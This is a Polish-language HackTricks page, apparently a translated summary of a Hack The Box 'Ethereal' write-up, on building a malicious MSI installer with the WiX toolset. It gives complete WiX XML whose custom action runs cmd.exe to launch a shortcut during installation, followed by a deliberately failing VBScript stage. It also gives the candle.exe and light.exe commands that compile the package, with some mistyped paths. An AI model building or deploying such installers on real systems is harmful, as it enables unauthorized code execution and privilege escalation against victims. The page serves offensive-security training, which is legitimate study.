{{#include ../../banners/hacktricks-training.md}}

# Tworzenie złośliwego MSI i uzyskiwanie uprawnień administratora

Tworzenie instalatora MSI zostanie przeprowadzone przy użyciu wixtools, a konkretnie zostaną wykorzystane [wixtools](http://wixtoolset.org). Warto wspomnieć, że próbowano alternatywnych budowniczych MSI, ale nie były one skuteczne w tym przypadku.

Aby uzyskać pełne zrozumienie przykładów użycia wix MSI, zaleca się zapoznanie się z [tą stroną](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Tutaj można znaleźć różne przykłady ilustrujące użycie wix MSI.

Celem jest wygenerowanie MSI, które uruchomi plik lnk. Aby to osiągnąć, można wykorzystać następujący kod XML ([xml stąd](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Ważne jest, aby zauważyć, że element Package zawiera atrybuty takie jak InstallerVersion i Compressed, które określają wersję instalatora oraz wskazują, czy pakiet jest skompresowany, czy nie.

Proces tworzenia polega na wykorzystaniu candle.exe, narzędzia z wixtools, do wygenerowania wixobject z msi.xml. Należy wykonać następujące polecenie:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Dodatkowo warto wspomnieć, że w poście znajduje się obrazek, który przedstawia polecenie i jego wynik. Możesz się do niego odwołać w celu uzyskania wskazówek wizualnych.

Ponadto, light.exe, kolejne narzędzie z wixtools, zostanie użyte do stworzenia pliku MSI z wixobject. Polecenie do wykonania jest następujące:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Podobnie jak w poprzednim poleceniu, w poście znajduje się obraz ilustrujący polecenie i jego wynik.

Należy zauważyć, że chociaż ten podsumowanie ma na celu dostarczenie cennych informacji, zaleca się odwołanie do oryginalnego posta w celu uzyskania bardziej szczegółowych informacji i dokładnych instrukcji.

## References

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
